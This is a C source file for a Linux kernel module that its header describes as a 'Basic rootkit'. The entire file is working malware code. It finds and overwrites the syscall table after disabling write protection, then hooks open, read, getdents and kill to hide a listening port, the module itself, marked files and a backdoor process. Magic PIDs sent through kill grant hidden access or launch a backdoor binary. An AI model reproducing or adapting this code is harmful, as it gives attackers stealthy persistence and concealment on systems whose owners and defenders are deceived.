/*
 * \file rootkit.c
 * \brief Implement a basic LKM.
 * \author Antoine.R
 * \version 0.1
 * \date 04/07/2018
 *
 * Implement A LKM with features : hide connection, hide pids, backdoor
 *
 */

#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/syscalls.h>
#include <linux/utsname.h>
#include <linux/socket.h>
//~ #include <arpa/inet.h>
#include <asm/current.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <asm/paravirt.h>


MODULE_AUTHOR("Antoine Rouquette");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Basic rootkit");

#define FILE_PATH           "/tmp/hack"
#define FILE_PATH_SIZE      9
#define FILE_BASENAME       "hack"
#define FILE_BASENAME_SIZE  4
#define BACKDOOR_PATH       "/home/antoine/Perso/rootkit/backdoor"
#define MAGIC_AUTH_PID      1234
#define MAGIC_BACKDOOR      1235
#define FD_HACK_BACKDOOR    0x666
#define MAX_PIDS            8
#define MIN(a,b)            ((a < b) ? a : b)
#define MAX_LINE_LEN        512

static pid_t pid_backdoor = 0;
static char pid_backdoor_str[12]= {'\0'};

static pid_t authorized_pids[MAX_PIDS] = {0};
static size_t authorized_pids_cnt = 0;


static const char* hidden_port[2] = {
    "0100007F:0462",    // 127.0.0.1:1122
    "00000000:0462"     // 0.0.0.0:1122
};

static const char* hidden_module[1] = {
    __this_module.name
};

/**
 * \struct vip_files
 * \brief Filename associated to a file decriptor.
 *
 * It is a structure with a filename associated to a file descriptor.
 * It should contain specific to be modified to hide infos
 */
struct vip_files
{
    char *          name;           /*!< Filename. */
    int             fd;             /*!< File descriptor associated. */
    size_t          needle_size;    /*!< needle table size. */
    const char **   needle;         /*!< table of string to check. */
};

/**
 * \struct linux_dirent
 * \brief Linux directory structure
 *
 */
struct linux_dirent
{
    unsigned long   d_ino;      /*!< Inode number */
    unsigned long   d_off;      /*!< Offset of the next linux dirent */
    unsigned short  d_reclen;   /*!< Length of this linux dirent */
    char            d_name[];   /*!< Filename */
};

struct vip_files vip_filenames[] = {
    {.name = "/proc/net/tcp", .fd = -1, .needle_size = 2, .needle = hidden_port},
    {.name = "/proc/modules", .fd = -1, .needle_size = 1, .needle = hidden_module}
};

const size_t vip_filenames_size = sizeof(vip_filenames) / sizeof(vip_filenames[0]);

//How to find the syscall address and not in hardcoded
unsigned long * sys_call = NULL;

// Original functions
asmlinkage int (*original_sys_open) (const char *pathname, int flags);
asmlinkage ssize_t (*original_sys_read) (int fd, void *buf, size_t count);
asmlinkage ssize_t (*original_sys_write) (int fd, const void *buf, size_t count);
asmlinkage int (*original_sys_close) (unsigned int fd);
asmlinkage int (*original_sys_getdents) (unsigned int fd, struct linux_dirent *dip, unsigned int count);
asmlinkage int (*original_sys_kill) (pid_t pid, int sig);
asmlinkage pid_t (*original_sys_getpid) (void);
asmlinkage pid_t (*original_sys_getppid) (void);

struct file *file_open(const char *path, int flags, int rights);
int file_close(struct file *file);
int file_read(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size);
int file_write(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size);

/**
 * \fn void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size)
 * \brief function to search a needle in a haystacks
 *
 * \param haystack : pointer to parsed buffer
 * \param haystack_size : size of the parsed buffer
 * \param needle : pointer to string to search for
 * \param needle_size : size of the needle to search for
 * \return pointer to the matching needle in the haystack, NULL if not found
 */
void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size)
{
    char *p;

    for(p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++)
        if(memcmp(p, needle, needle_size) == 0)
            return (void *)p;
    return NULL;
}

#ifdef __x86_64__
/**
 * \fn unsigned long *find_sys_call_table(void)
 * \brief function to find the syscall address based on LSTAR register for 64 bits
 *
 * \return Adress of the syscall table, NULL if not found
 */
unsigned long *find_sys_call_table(void)
{
    int i = 0;
    unsigned long sct_off = 0;
    unsigned char code[512];
    char **p;

    rdmsrl(MSR_LSTAR, sct_off);
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);

    printk("Start Hexdump for MSR_LSTAR\n");
    for(i = 0; i < 512; i++)
    {
        printk("%.2x", code[i]);
    }
    printk("End Hexdump for MSR_LSTAR\n");

    if(p) {
        unsigned long *table = *(unsigned long **)((char *)p + 3);
        table = (unsigned long *)(((unsigned long)table & 0xffffffff) | 0xffffffff00000000);
        return table;
    }
    return NULL;
}

#else
/**
 * \struct idtr
 * \brief Don't exactly know what to do here
 *
 */
struct {
    unsigned short limit;
    unsigned long base;
} __attribute__ ((packed))idtr;

/**
 * \struct idt
 * \brief Don't exactly know what to do here
 *
 */
struct {
    unsigned short off1;
    unsigned short sel;
    unsigned char none, flags;
    unsigned short off2;
} __attribute__ ((packed))idt;

/**
 * \fn unsigned long *find_sys_call_table(void)
 * \brief function to find the syscall address based on LSTAR register for 32 bits
 *
 * \return Adress of the syscall table, NULL if not found
 */
unsigned long *find_sys_call_table(void) {
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[255];

    asm("sidt %0":"=m" (idtr));
    memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
    sct_off = (idt.off2 << 16) | idt.off1;
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);

    if(p) return *(unsigned long **)((char *)p + 3);
    else return NULL;
}

#endif

/**
 * \fn      static int is_proc_authorized(pid_t pid)
 * \brief   Check if a given pid is authorized to read specific file
 * \param   pid : the pid to be checked
 * \return  1 if proc is authorized, 0 otherwise
 * */
static int is_proc_authorized(pid_t pid)
{
    int i;

    for(i = 0; i < authorized_pids_cnt; i++)
        if(pid == authorized_pids[i])
            return 1;
    return 0;
}

/**
 * \fn      static int get_vip_index(const char * filename)
 * \brief   get the table index of a filename
 * \param   filename : filename to be checked
 * \return  index if found, -1 otherwise
 * */
static int get_vip_index(const char * filename)
{
    size_t i = 0;

    if(!filename || !strlen(filename))
        return -1;

    for(i=0; i < vip_filenames_size; i++)
    {
        if(!strncmp(vip_filenames[i].name, filename, MIN(strlen(vip_filenames[i].name),strlen(filename))))
            return i;
    }
    return -1;
}

/**
 * \fn      static int create_hack_file(void)
 * \brief   Create small file with index written inside it
 * \return  0 if everything went well.
 * */
static int create_hack_file(void)
{
#define MAX_NAME_SIZE   64
    int     cnt                     = 0;
    char    filename[MAX_NAME_SIZE] = {'\0'};
    struct  file * filp             = NULL;

    do
    {
        snprintf(filename, MAX_NAME_SIZE, "%s%d.txt", FILE_PATH, cnt);
        filp = file_open(filename, O_RDWR | O_APPEND | O_CREAT, 0);
        if(filp)
        {
            printk("[%s] File : %s created!\n", __this_module.name, filename);
            file_write(filp, 0, filename, strlen(filename));
            file_close(filp);
            filp = NULL;
        }
        cnt++;
    } while(cnt < 10);

    return 0;
}

/**
 * \fn      static char * extract_line(const char * buf, char * line, size_t count)
 * \brief   Extract the 1st line found in a buffer
 * \param   buf  : buffer to be checked for a line
 * \param   line : buffer to store the line found
 * \param   count: max size of the line buffer
 * \return  pointer to the value after '\n', NULL if EOF or no newline found
 * */
static char * extract_line(const char * buf, char * line, size_t count)
{
    char * 	tok = NULL;
    size_t  len = 0;

    if(!buf || !line)
        return NULL;

    tok = strstr(buf, "\n");

    if(!tok)
    {
        len = strlen(buf);
        if(len > 0 && len < count)
            memcpy(line, buf, len + 1);
        return NULL;
    }

    if((len = tok - buf + 1) > count)
        return NULL;

    memcpy(line, buf, len);
    memcpy(line + len, "\0", 1);

    if(*(tok + 1) == '\0')
        return NULL;

    return (tok + 1);
}

/**
 * \fn      struct file *file_open(const char *path, int flags, int rights)
 * \brief   Open a file in kernel mode
 * \param   path  : path to the file to open
 * \param   flags : flags used to open the file
 * \param   rights: handle ownership of the created file
 * \return  pointer to struct file, NULL if failure
 * */
struct file *file_open(const char *path, int flags, int rights)
{
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    // on stocke l'ancien filesystem ici
    oldfs  = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if(IS_ERR(filp))
    {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}
 
 /**
 * \fn      int file_close(struct file *file)
 * \brief   close a file in kernel mode
 * \param   file  : pointer to the struct file  to close
 * \return  status of the fiel closure
 * */
int file_close(struct file *file)
{
    return filp_close(file, NULL);
}

/**
 * \fn int file_read(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size)
 * \brief read a file in kernel mode
 * \param file  : pointer to the struct file  to read
 * \param offset: position of the curser in opened file
 * \param data  : start pointer of the buffer to store data
 * \param size  : size of the storage buffer
 * \return number of bytes read
 * */
int file_read(struct file * file, unsigned long long offset, unsigned char * data, 
                   unsigned int size)
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_read(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

/**
 * \fn      int file_write(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size)
 * \brief   Write into a file in kernel mode
 * \param file  : pointer to the struct file  to read
 * \param offset: position of the curser in opened file
 * \param data  : start pointer of the buffer to store data
 * \param size  : size of the storage buffer
 * \return number of bytes written
 * */
int file_write(struct file * file, unsigned long long offset, unsigned char * data, 
                    unsigned int size)
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

/**
 * \fn      int file_sync(struct file * file)
 * \brief   Sync a file
 * \param file : file struct to synched
 * \return 0
 * */
int file_sync(struct file * file)
{
    vfs_fsync(file, 0);
    return 0;
}

// Finish editing some files here
 
asmlinkage int fake_sys_open(const char *pathname, int flags)
{
    int fd = -1;
    int is_vip = -1;
 
    pid_t pid  = original_sys_getpid();
    pid_t ppid = original_sys_getppid();

    is_vip = get_vip_index(pathname);

    // If authorized, we can open the file
    if(is_proc_authorized(pid) || is_proc_authorized(ppid))
    {
        fd = original_sys_open(pathname, flags);
        if(is_vip >= 0)
            vip_filenames[is_vip].fd = fd;
    }
    else
    {
        if(!strstr(pathname, FILE_BASENAME))
        {
            fd = original_sys_open(pathname, flags);
            if(is_vip >= 0)
                vip_filenames[is_vip].fd = fd;
        }
    }
    return fd;
}

asmlinkage ssize_t fake_sys_write(int fd, const void *buf, size_t count)
{
    if(fd == FD_HACK_BACKDOOR)
    {
        pid_backdoor = *(pid_t*)buf;
        snprintf(pid_backdoor_str, 12, "%d", pid_backdoor);
        return -1;
    }
    return original_sys_write(fd, buf, count);
}

static ssize_t filter_vip_file(char * text, size_t count, ssize_t read, int vip_index)
{
    int j = 0, skip = 0, len = 0;
    char * p                = text;
    char line[MAX_LINE_LEN];
    ssize_t offset          = 0;
    char * tmp              = NULL;

    if((tmp = (char*)kmalloc(count, GFP_KERNEL)) == NULL)
        return 0;

    //lets just print tmp for now
    do
    {
        memset(line, 0, MAX_LINE_LEN);
        p = extract_line(p, line, MAX_LINE_LEN);
        len = strlen(line);

        if(len > 0)
        {
            for(j = 0; j < vip_filenames[vip_index].needle_size; j++)
            {
                if(strstr(line, vip_filenames[vip_index].needle[j]))
                {
                    skip = 1;
                    break;
                }
            }
            if(skip)
            {
                skip = 0;
                read -= len + 1;
                continue;
            }

            memcpy(tmp + offset, line, len);
            offset += len;
        }
    }while(p);

    // Zero padding at the end of the buffer
    memcpy(tmp + offset, "\0", 1);
    memcpy(text, tmp, offset + 1);
    kfree(tmp);
    return read;
}

asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
{
    int     index = 0;
    ssize_t read     = 0;
    pid_t   pid     = original_sys_getpid();
    pid_t   ppid    = original_sys_getppid();

    for(index = 0; index < vip_filenames_size; index++)
        if(vip_filenames[index].fd == fd)
            break;

    read = original_sys_read(fd, buf, count);

    // Not a vip file, read in normally
    if(index == vip_filenames_size || is_proc_authorized(pid) || is_proc_authorized(ppid))
        return read;

    read = filter_vip_file((char*) buf, count, read, index);

    vip_filenames[index].fd = -1;

    return read;
}

asmlinkage int fake_sys_kill(pid_t pid, int sig)
{
    int             ret     = 0;
    //~ pid_t       child;
    char * argv[]           = {BACKDOOR_PATH, NULL};
    char * envp[]           = { NULL };

    switch(pid)
    {
        case MAGIC_AUTH_PID:
            printk("[%s] Received auth key...\n", __this_module.name);
            if(authorized_pids_cnt < MAX_PIDS)
                authorized_pids[authorized_pids_cnt++] = current->pid;
            break;
        case MAGIC_BACKDOOR:
            printk("[%s] Start process backdoor\n", __this_module.name);
            ret = call_usermodehelper(BACKDOOR_PATH, argv, envp, UMH_WAIT_EXEC);
            //~ ret = original_sys_execve(filename, argv, envp);
            printk("[%s] Finish process backdoor %d\n", __this_module.name, ret);
            break;
        default:
            ret = original_sys_kill(pid, sig);
    }
    return ret;
}

asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
// Get the relevant informations
#define LOGS_SIZE   512
    unsigned long           bpos        = 0;
    unsigned long           lost_data   = 0;
    char                    * buf;
    char                    d_type;
    char                    logs[LOGS_SIZE];
    struct linux_dirent *   dir         = NULL;
    struct linux_dirent *   prev        = NULL;
    int                     nread       = 0;
    pid_t                   pid         = original_sys_getpid();
    pid_t                   ppid        = original_sys_getppid();

    if(is_proc_authorized(pid) || is_proc_authorized(ppid))
        return original_sys_getdents(fd, dirp, count);

    nread = original_sys_getdents(fd, dirp, count);

    buf = (char*)dirp;

    if(nread < 0)
        return nread;
    else if(nread == 0)
        return nread;

    for(bpos = 0; bpos < nread;)
    {
        dir = (struct linux_dirent *)(buf + bpos);
        d_type = *(buf + bpos + dir->d_reclen - 1);
        snprintf(logs, LOGS_SIZE,"%8ld    %-10s  %4d %10lld  %s\n", dir->d_ino,
            (d_type == DT_REG) ?  "regular" :
            (d_type == DT_DIR) ?  "directory" :
            (d_type == DT_FIFO) ? "FIFO" :
            (d_type == DT_SOCK) ? "socket" :
            (d_type == DT_LNK) ?  "symlink" :
            (d_type == DT_BLK) ?  "block dev" :
            (d_type == DT_CHR) ?  "char dev" : "???",
            dir->d_reclen, (long long) dir->d_off, dir->d_name);
        //~ printk("[%s] --------------- nread=%d ---------------\n", __this_module.name, nread);
        //~ printk("[%s] inode#    file type  d_reclen  d_off   d_name\n", __this_module.name);
        //~ printk("[%s] %s", __this_module.name, logs);

        if(strlen(dir->d_name) > 3)
        {
            // Shit, we get the file of the same name, hide it, is it 1st element!
            if(!memcmp(dir->d_name, "hack", MIN(strlen(dir->d_name), strlen("hack"))) ||
                !memcmp(dir->d_name, "rootkit", MIN(strlen(dir->d_name), strlen("rootkit"))))
            {
                // Just move the 1st block in that case and don't do anything
                if(!prev)
                {
                    struct linux_dirent *   next    = (struct linux_dirent *)(buf + bpos + dir->d_reclen);
                    unsigned long           offset  = dir->d_reclen + next->d_reclen;
                    lost_data += dir->d_reclen;
                    dir = (struct linux_dirent *)memmove(dir, next, next->d_reclen);
                    dir->d_reclen = offset;
                    continue;
                }
                else
                {
                    lost_data += dir->d_reclen;
                    prev->d_reclen += dir->d_reclen;
                    bpos += dir->d_reclen;
                    continue;
                }
            }
        }
        if(strlen(pid_backdoor_str) > 0)
        {
            if(!memcmp(dir->d_name, pid_backdoor_str, MIN(strlen(dir->d_name), strlen(pid_backdoor_str))))
            {
                // Just move the 1st block in that case and don't do anything
                if(!prev)
                {
                    struct linux_dirent *   next    = (struct linux_dirent *)(buf + bpos + dir->d_reclen);
                    unsigned long           offset  = dir->d_reclen + next->d_reclen;
                    lost_data += dir->d_reclen;
                    dir = (struct linux_dirent *)memmove(dir, next, next->d_reclen);
                    dir->d_reclen = offset;
                    continue;
                }
                else
                {
                    lost_data += dir->d_reclen;
                    prev->d_reclen += dir->d_reclen;
                    bpos += dir->d_reclen;
                    continue;
                }
            }
        }

        prev = dir;
        // move to next linux_dirent
        bpos += dir->d_reclen;
    }

    return (nread - lost_data);
}

static int __init lkm_init(void)
{
    sys_call = (unsigned long *)find_sys_call_table();

    if(!sys_call)
    {
        sys_call = (unsigned long *)kallsyms_lookup_name("sys_call_table");
        if(!sys_call)
        {
            printk("[%s] module not loaded, could not find syscall table\n", __this_module.name);
        }
        else
        {
            printk("[%s] 2.sys_call_table : 0x%p.\n", __this_module.name, sys_call);
        }
    }
    else
        printk("[%s] 1.sys_call_table found : 0x%p.\n", __this_module.name, sys_call);

    create_hack_file();

    original_sys_open       = sys_call[__NR_open];
    original_sys_read       = sys_call[__NR_read];
    original_sys_write      = sys_call[__NR_write];
    original_sys_close      = sys_call[__NR_close];
    original_sys_getdents   = sys_call[__NR_getdents];
    original_sys_kill       = sys_call[__NR_kill];
    original_sys_getpid     = sys_call[__NR_getpid];
    original_sys_getppid    = sys_call[__NR_getppid];
    write_cr0(read_cr0() & (~0x10000));
    sys_call[__NR_open]     = fake_sys_open;
    sys_call[__NR_write]    = fake_sys_write;
    sys_call[__NR_read]     = fake_sys_read;
    sys_call[__NR_getdents] = fake_sys_getdents;
    sys_call[__NR_kill]     = fake_sys_kill;
    write_cr0(read_cr0() | (0x10000));
    printk(KERN_INFO "[%s] module loaded.\n", __this_module.name);
    return 0;
}

static void __exit lkm_exit(void)
{
    //Do not forget to kill backdoor
    if(pid_backdoor != 0)
        if(original_sys_kill(pid_backdoor, SIGKILL) == 0)
            printk("%s Successful send SIGKILL to backdoor[%d]", __this_module.name, pid_backdoor);

    write_cr0(read_cr0() & (~0x10000));
    sys_call[__NR_open]     = original_sys_open;
    sys_call[__NR_write]     = original_sys_write;
    sys_call[__NR_read]     = original_sys_read;
    sys_call[__NR_getdents] = original_sys_getdents;
    sys_call[__NR_kill]     = original_sys_kill;
    write_cr0(read_cr0() | (0x10000));
    printk(KERN_INFO "[%s] module unloaded.\n", __this_module.name);
}

// how to find the syscall table in this case

module_init(lkm_init);
module_exit(lkm_exit);
